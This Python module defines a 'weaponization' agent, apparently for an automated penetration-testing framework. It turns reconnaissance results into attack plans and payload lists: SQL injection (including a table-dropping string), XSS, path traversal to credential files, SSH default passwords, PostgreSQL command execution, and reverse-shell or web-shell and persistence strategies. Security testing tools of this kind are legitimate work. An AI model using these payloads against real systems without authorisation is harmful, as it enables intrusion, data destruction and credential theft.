"""
武器化Agent - 负责根据侦察结果构造攻击载荷
按照Cyber Kill Chain的武器化阶段设计
"""
import asyncio
import logging
import json
from typing import Dict, Any, List, Optional
from datetime import datetime

from .base_agent import BaseAgent
from ..database.logging_service import pentest_logger
from ..orchestrator.states import AgentType


class WeaponizeAgent(BaseAgent):
    """武器化Agent - 负责构造攻击载荷和exploit"""
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("WeaponizeAgent", config.get("safe_mode", True) if config else True)
        
        self.config = config or {}
        
        # 武器化配置
        self.payload_templates = self._load_payload_templates()
        self.exploit_database = self._load_exploit_database()
        self.custom_payloads_enabled = config.get("custom_payloads_enabled", False)
        
        self.logger.info(f"武器化Agent初始化完成 - Safe Mode: {self.safe_mode}")
    
    async def execute(self, target_info: Dict[str, Any], context: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        执行武器化任务
        
        Args:
            target_info: 目标信息
            context: 执行上下文（包含侦察结果）
            
        Returns:
            Dict[str, Any]: 武器化结果
        """
        try:
            if not self.validate_input(target_info):
                return self.create_result(success=False, error="输入验证失败")
            
            target = target_info["target"]
            session_context = context[0] if context else {}
            session_id = session_context.get("session_id")
            
            # 获取侦察结果
            global_context = session_context.get("global_context", {})
            services = global_context.get("discovered_services", [])
            vulnerabilities = global_context.get("identified_vulnerabilities", [])
            
            self.logger.info(f"开始武器化 - 目标: {target}, 发现服务: {len(services)}")
            
            # 记录开始武器化
            if session_id:
                pentest_logger.log_agent_action(
                    session_id=session_id,
                    agent_name=self.name,
                    agent_type=AgentType.WEAPONIZE_AGENT,
                    log_level="INFO",
                    log_type="EXECUTION",
                    message=f"开始武器化 - 目标: {target}",
                    details={
                        "target": target,
                        "services_count": len(services),
                        "vulnerabilities_count": len(vulnerabilities)
                    }
                )
            
            # 执行武器化
            weaponization_results = await self._perform_weaponization(
                target, services, vulnerabilities, session_id
            )
            
            self.logger.info(f"武器化完成 - 生成 {len(weaponization_results.get('payloads', []))} 个载荷")
            
            return self.create_result(
                success=True,
                data=weaponization_results
            )
            
        except Exception as e:
            self.logger.error(f"武器化任务失败: {e}")
            return self.create_result(success=False, error=str(e))
    
    async def _perform_weaponization(self, target: str, services: List[Dict[str, Any]], 
                                   vulnerabilities: List[Dict[str, Any]], session_id: str) -> Dict[str, Any]:
        """
        执行武器化过程
        
        Args:
            target: 目标地址
            services: 发现的服务
            vulnerabilities: 识别的漏洞
            session_id: 会话ID
            
        Returns:
            Dict[str, Any]: 武器化结果
        """
        results = {
            "target": target,
            "payloads": [],
            "exploits": [],
            "attack_vectors": [],
            "weaponization_strategy": {}
        }
        
        # 1. 分析攻击面
        attack_surface = await self._analyze_attack_surface(services, vulnerabilities)
        results["attack_surface_analysis"] = attack_surface
        
        # 2. 生成针对性载荷
        if services:
            service_payloads = await self._generate_service_payloads(services, session_id)
            results["payloads"].extend(service_payloads)
        
        # 3. 匹配已知漏洞的exploit
        if vulnerabilities:
            exploits = await self._match_exploits_for_vulnerabilities(vulnerabilities, session_id)
            results["exploits"].extend(exploits)
        
        # 4. 生成攻击向量
        attack_vectors = await self._generate_attack_vectors(services, vulnerabilities)
        results["attack_vectors"] = attack_vectors
        
        # 5. 制定武器化策略
        strategy = await self._develop_weaponization_strategy(attack_surface, services, vulnerabilities)
        results["weaponization_strategy"] = strategy
        
        return results
    
    async def _analyze_attack_surface(self, services: List[Dict[str, Any]], 
                                    vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析攻击面"""
        analysis = {
            "web_applications": [],
            "network_services": [],
            "database_services": [],
            "remote_access_services": [],
            "vulnerable_services": [],
            "priority_targets": []
        }
        
        for service in services:
            service_name = service.get("service", "unknown")
            port = service.get("port")
            
            if service_name in ["http", "https", "http-alt"]:
                analysis["web_applications"].append({
                    "port": port,
                    "service": service_name,
                    "attack_methods": ["directory_traversal", "sql_injection", "xss", "command_injection"]
                })
            elif service_name in ["ssh", "telnet", "rdp"]:
                analysis["remote_access_services"].append({
                    "port": port,
                    "service": service_name,
                    "attack_methods": ["brute_force", "credential_stuffing", "exploit_auth_bypass"]
                })
            elif service_name in ["mysql", "postgresql", "mssql", "oracle"]:
                analysis["database_services"].append({
                    "port": port,
                    "service": service_name,
                    "attack_methods": ["sql_injection", "brute_force", "privilege_escalation"]
                })
            else:
                analysis["network_services"].append({
                    "port": port,
                    "service": service_name,
                    "attack_methods": ["buffer_overflow", "protocol_fuzzing", "service_enumeration"]
                })
        
        # 标记有漏洞的服务
        for vuln in vulnerabilities:
            service_port = vuln.get("port")
            if service_port:
                matching_service = next((s for s in services if s.get("port") == service_port), None)
                if matching_service:
                    analysis["vulnerable_services"].append({
                        "service": matching_service,
                        "vulnerability": vuln,
                        "exploitability": "HIGH"
                    })
        
        # 确定优先目标
        analysis["priority_targets"] = self._determine_priority_targets(analysis)
        
        return analysis
    
    async def _generate_service_payloads(self, services: List[Dict[str, Any]], session_id: str) -> List[Dict[str, Any]]:
        """生成针对服务的载荷"""
        payloads = []
        
        for service in services:
            service_name = service.get("service", "unknown")
            port = service.get("port")
            
            if service_name in ["http", "https", "http-alt"]:
                # Web应用载荷
                web_payloads = await self._generate_web_payloads(service, session_id)
                payloads.extend(web_payloads)
            
            elif service_name == "ssh":
                # SSH载荷
                ssh_payloads = await self._generate_ssh_payloads(service, session_id)
                payloads.extend(ssh_payloads)
            
            elif service_name in ["mysql", "postgresql", "mssql"]:
                # 数据库载荷
                db_payloads = await self._generate_database_payloads(service, session_id)
                payloads.extend(db_payloads)
            
            # 通用网络服务载荷
            if service_name not in ["http", "https", "http-alt", "ssh"]:
                generic_payloads = await self._generate_generic_payloads(service, session_id)
                payloads.extend(generic_payloads)
        
        return payloads
    
    async def _generate_web_payloads(self, service: Dict[str, Any], session_id: str) -> List[Dict[str, Any]]:
        """生成Web应用载荷"""
        payloads = []
        port = service.get("port")
        
        # SQL注入载荷
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT 1,2,3--",
            "admin'--",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--"
        ]
        
        for payload in sql_payloads:
            if self.safe_mode:
                payloads.append({
                    "type": "sql_injection",
                    "payload": payload,
                    "target_service": f"http:{port}",
                    "risk_level": "HIGH",
                    "safe_mode": True,
                    "description": "SQL注入测试载荷（安全模式）"
                })
        
        # XSS载荷
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'><script>alert('XSS')</script>"
        ]
        
        for payload in xss_payloads:
            if self.safe_mode:
                payloads.append({
                    "type": "xss",
                    "payload": payload,
                    "target_service": f"http:{port}",
                    "risk_level": "MEDIUM",
                    "safe_mode": True,
                    "description": "XSS测试载荷（安全模式）"
                })
        
        # 目录遍历载荷
        directory_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in directory_traversal_payloads:
            payloads.append({
                "type": "directory_traversal",
                "payload": payload,
                "target_service": f"http:{port}",
                "risk_level": "HIGH",
                "safe_mode": self.safe_mode,
                "description": "目录遍历测试载荷"
            })
        
        return payloads
    
    async def _generate_ssh_payloads(self, service: Dict[str, Any], session_id: str) -> List[Dict[str, Any]]:
        """生成SSH载荷"""
        payloads = []
        port = service.get("port")
        
        # 常用用户名密码组合
        common_credentials = [
            ("admin", "admin"),
            ("root", "root"),
            ("admin", "password"),
            ("root", "toor"),
            ("user", "user"),
            ("test", "test"),
            ("guest", "guest")
        ]
        
        for username, password in common_credentials:
            payloads.append({
                "type": "ssh_brute_force",
                "username": username,
                "password": password,
                "target_service": f"ssh:{port}",
                "risk_level": "MEDIUM",
                "safe_mode": self.safe_mode,
                "description": f"SSH暴力破解载荷 - {username}:{password}"
            })
        
        return payloads
    
    async def _generate_database_payloads(self, service: Dict[str, Any], session_id: str) -> List[Dict[str, Any]]:
        """生成数据库载荷"""
        payloads = []
        port = service.get("port")
        service_name = service.get("service")
        
        # 数据库特定的SQL注入载荷
        if service_name == "mysql":
            mysql_payloads = [
                "SELECT @@version",
                "SHOW DATABASES",
                "SELECT user FROM mysql.user",
                "LOAD_FILE('/etc/passwd')"
            ]
            
            for payload in mysql_payloads:
                payloads.append({
                    "type": "mysql_injection",
                    "payload": payload,
                    "target_service": f"mysql:{port}",
                    "risk_level": "HIGH",
                    "safe_mode": self.safe_mode,
                    "description": f"MySQL注入载荷 - {payload}"
                })
        
        elif service_name == "postgresql":
            postgres_payloads = [
                "SELECT version()",
                "SELECT current_database()",
                "SELECT usename FROM pg_user",
                "COPY (SELECT '') TO PROGRAM 'id'"
            ]
            
            for payload in postgres_payloads:
                payloads.append({
                    "type": "postgresql_injection",
                    "payload": payload,
                    "target_service": f"postgresql:{port}",
                    "risk_level": "HIGH",
                    "safe_mode": self.safe_mode,
                    "description": f"PostgreSQL注入载荷 - {payload}"
                })
        
        return payloads
    
    async def _generate_generic_payloads(self, service: Dict[str, Any], session_id: str) -> List[Dict[str, Any]]:
        """生成通用载荷"""
        payloads = []
        port = service.get("port")
        service_name = service.get("service")
        
        # 缓冲区溢出测试载荷
        buffer_overflow_payloads = [
            "A" * 100,
            "A" * 1000,
            "A" * 10000
        ]
        
        for payload in buffer_overflow_payloads:
            payloads.append({
                "type": "buffer_overflow",
                "payload": payload,
                "target_service": f"{service_name}:{port}",
                "risk_level": "HIGH",
                "safe_mode": self.safe_mode,
                "description": f"缓冲区溢出测试载荷 - {len(payload)} bytes"
            })
        
        return payloads
    
    async def _match_exploits_for_vulnerabilities(self, vulnerabilities: List[Dict[str, Any]], 
                                                session_id: str) -> List[Dict[str, Any]]:
        """为已知漏洞匹配exploit"""
        exploits = []
        
        for vuln in vulnerabilities:
            cve_id = vuln.get("cve_id")
            vuln_type = vuln.get("vulnerability_type", "")
            
            if cve_id:
                # 根据CVE ID查找exploit
                matched_exploits = self._find_exploits_by_cve(cve_id)
                for exploit in matched_exploits:
                    exploit["target_vulnerability"] = vuln
                    exploit["safe_mode"] = self.safe_mode
                    exploits.append(exploit)
            
            elif vuln_type:
                # 根据漏洞类型查找通用exploit
                generic_exploits = self._find_exploits_by_type(vuln_type)
                for exploit in generic_exploits:
                    exploit["target_vulnerability"] = vuln
                    exploit["safe_mode"] = self.safe_mode
                    exploits.append(exploit)
        
        return exploits
    
    async def _generate_attack_vectors(self, services: List[Dict[str, Any]], 
                                     vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """生成攻击向量"""
        attack_vectors = []
        
        # 基于服务的攻击向量
        for service in services:
            service_name = service.get("service")
            port = service.get("port")
            
            if service_name in ["http", "https"]:
                attack_vectors.append({
                    "vector_type": "web_application",
                    "target_service": f"{service_name}:{port}",
                    "attack_methods": [
                        "directory_enumeration",
                        "parameter_fuzzing",
                        "authentication_bypass",
                        "file_upload_exploitation"
                    ],
                    "priority": "HIGH" if service_name == "https" else "MEDIUM"
                })
            
            elif service_name == "ssh":
                attack_vectors.append({
                    "vector_type": "remote_access",
                    "target_service": f"ssh:{port}",
                    "attack_methods": [
                        "credential_brute_force",
                        "key_based_authentication",
                        "protocol_vulnerability_exploitation"
                    ],
                    "priority": "HIGH"
                })
        
        return attack_vectors
    
    async def _develop_weaponization_strategy(self, attack_surface: Dict[str, Any], 
                                            services: List[Dict[str, Any]], 
                                            vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """制定武器化策略"""
        strategy = {
            "primary_attack_path": [],
            "alternative_paths": [],
            "payload_deployment_strategy": {},
            "risk_assessment": {}
        }
        
        # 确定主要攻击路径
        priority_targets = attack_surface.get("priority_targets", [])
        if priority_targets:
            primary_target = priority_targets[0]
            strategy["primary_attack_path"] = [
                {
                    "step": 1,
                    "action": "exploit_primary_service",
                    "target": primary_target,
                    "method": "automated_exploitation"
                },
                {
                    "step": 2,
                    "action": "establish_foothold",
                    "target": primary_target,
                    "method": "payload_deployment"
                },
                {
                    "step": 3,
                    "action": "privilege_escalation",
                    "target": primary_target,
                    "method": "local_exploit"
                }
            ]
        
        # 备选攻击路径
        web_apps = attack_surface.get("web_applications", [])
        if len(web_apps) > 1:
            strategy["alternative_paths"].append({
                "path_name": "web_application_exploitation",
                "targets": web_apps[1:],
                "priority": "MEDIUM"
            })
        
        # 载荷部署策略
        strategy["payload_deployment_strategy"] = {
            "delivery_method": "web_shell" if web_apps else "reverse_shell",
            "persistence_method": "scheduled_task" if not self.safe_mode else "none",
            "communication_protocol": "https" if any(s.get("service") == "https" for s in services) else "http"
        }
        
        # 风险评估
        strategy["risk_assessment"] = {
            "detection_likelihood": "LOW" if self.safe_mode else "MEDIUM",
            "impact_potential": "HIGH" if vulnerabilities else "MEDIUM",
            "mitigation_required": not self.safe_mode
        }
        
        return strategy
    
    def _determine_priority_targets(self, attack_surface: Dict[str, Any]) -> List[Dict[str, Any]]:
        """确定优先攻击目标"""
        targets = []
        
        # Web应用优先级较高
        for web_app in attack_surface.get("web_applications", []):
            targets.append({
                "target": web_app,
                "priority": "HIGH",
                "reason": "Web applications often have multiple attack vectors"
            })
        
        # 有漏洞的服务优先级最高
        for vuln_service in attack_surface.get("vulnerable_services", []):
            targets.append({
                "target": vuln_service,
                "priority": "CRITICAL",
                "reason": "Known vulnerability present"
            })
        
        # 远程访问服务
        for remote_service in attack_surface.get("remote_access_services", []):
            targets.append({
                "target": remote_service,
                "priority": "HIGH",
                "reason": "Direct system access potential"
            })
        
        # 按优先级排序
        priority_order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
        targets.sort(key=lambda x: priority_order.get(x["priority"], 0), reverse=True)
        
        return targets
    
    def _find_exploits_by_cve(self, cve_id: str) -> List[Dict[str, Any]]:
        """根据CVE ID查找exploit"""
        # 这里应该连接实际的exploit数据库
        # 目前返回模拟数据
        return [
            {
                "exploit_id": f"exploit_{cve_id}",
                "cve_id": cve_id,
                "name": f"Exploit for {cve_id}",
                "type": "remote_code_execution",
                "reliability": "good",
                "platform": "linux"
            }
        ]
    
    def _find_exploits_by_type(self, vuln_type: str) -> List[Dict[str, Any]]:
        """根据漏洞类型查找通用exploit"""
        # 返回通用exploit模板
        return [
            {
                "exploit_id": f"generic_{vuln_type}",
                "vulnerability_type": vuln_type,
                "name": f"Generic {vuln_type} exploit",
                "type": "generic",
                "reliability": "average",
                "platform": "multi"
            }
        ]
    
    def _load_payload_templates(self) -> Dict[str, Any]:
        """加载载荷模板"""
        # 这里应该从配置文件或数据库加载
        return {
            "web_shells": [],
            "reverse_shells": [],
            "bind_shells": [],
            "backdoors": []
        }
    
    def _load_exploit_database(self) -> Dict[str, Any]:
        """加载exploit数据库"""
        # 这里应该从exploit数据库加载
        return {
            "metasploit_modules": [],
            "custom_exploits": [],
            "public_exploits": []
        }
    
    def get_capabilities(self) -> List[str]:
        """获取武器化Agent的能力列表"""
        return [
            "payload_generation",
            "exploit_matching",
            "attack_vector_analysis",
            "weaponization_strategy",
            "vulnerability_exploitation",
            "attack_surface_analysis",
            "custom_payload_creation",
            "multi_stage_payload_development"
        ]
